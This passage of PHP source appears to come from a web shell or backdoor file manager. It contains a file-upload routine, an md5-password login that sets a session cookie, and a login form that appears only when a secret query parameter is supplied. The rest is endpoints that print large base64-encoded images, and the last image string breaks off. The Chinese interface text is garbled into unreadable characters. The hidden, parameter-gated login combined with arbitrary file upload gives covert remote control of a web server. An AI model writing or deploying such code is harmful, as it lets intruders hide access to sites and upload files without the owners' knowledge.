              }else{
                if(is_utf8($upfilename)){
              	     $uploadname= iconv('UTF-8', 'GB2312', $upfilename);
                }else{
                     $uploadname=$upfilename;
                }
              }
                if (!move_uploaded_file($upfile['tmp_name'], $dir."/".$uploadname)) 
                { 
                        echo "Possible file upload attack! Here's some debugging info:\n"; 
                        print_r($_FILES); 
                        exit(); 
                }
                return $uploadname; 
        } 
        else 
        { 
                return ''; 
        } 
} 

$���=_asUpFiles($dir, "file", '', '', $title);

echo "{ path: \"".$dir."/".$���."\", name: \"".$���."\" }";
die();
}


if($_GET['login']==2){
		unset($_SESSION['MySESSION8']);
		setcookie('cookie_user','',time()-3600); 
		header("location:?");
}elseif($_GET['login']==1){
	    $pwd=md5($_POST['pwd']);
	    $img=$_POST['img'];
	  if(getfun("imageline")=='Yes'){ 
	    if($_SESSION['validationcode']!=$img){
	    header("location:?a=$a");
	    die();
	    }
	  }
		if($pwd==$adminpass){
		setcookie("cookie_user",$pwd);
		$_SESSION['MySESSION8']=$pwd;
    header("location:?");
		}else{
		header("location:?a=$a");
		}
}
if($_SESSION['MySESSION8']!=$adminpass){
if($_GET[$color11]==$color10){
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"> 
<script language="javascript">
function newgdcode(obj,url) {
obj.src = url+ '?nowtime=' + new Date().getTime();
}
</script>
<style>span{margin:0 0.5em;font-size:85.7%;}</style>
</head> 
<body onload="document.getElementById('password').focus();">
<form action=?login=1&a=<?=$a?> method=post>
<table border="0" width="100">
	<tr>
		<td><input type="password" name="pwd" style="width:90px;" id="password" title="����"></td>
		<?if(getfun("imageline")=='Yes'){?>
		<td><img src="?createimg=1" title="�����������һ��" align="absmiddle" style="cursor: pointer;" onclick="javascript:newgdcode(this,this.src);" /></td>
		<td><input type="text" name="img" style="width:35px;" title="��֤��"></td>
		<?}?>
		<td><input type=submit value=�ύ></td>
	</tr>
</table>
<span style="display:none;" id="ka">��д�����������£���ע���Сд</span>
</form>
<script type="text/javascript">
//<![CDATA[
function  detectCapsLock(event){
    var e = event||window.event;
    var o = e.target||e.srcElement;
    var oTip = document.getElementById('ka');
    var keyCode  =  e.keyCode||e.which; // ������keyCode 
    var isShift  =  e.shiftKey ||(keyCode  ==   16 ) || false ; // shift���Ƿ�ס
     if (
     ((keyCode >=   65   &&  keyCode  <=   90 )  &&   !isShift) // Caps Lock �򿪣���û�а�סshift�� 
     || ((keyCode >=   97   &&  keyCode  <=   122 )  &&  isShift)// Caps Lock �򿪣��Ұ�סshift��
     ){oTip.style.display = '';}
     else{oTip.style.display  =  'none';} 
}
document.getElementById('password').onkeypress = detectCapsLock;
//]]>
</script> 
</body> 
</html>
<?
}
		exit;
}else{



////////////////////ͼƬ����//////////////////////////////
if ($imgname != "") {
        if ($imgname == "allbgs.gif") {
        	header('content-type:image/png');
            echo base64_decode("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");
            }
        elseif($imgname == "yangwen") {
        	header('content-type:image/gif'); 
            echo base64_decode("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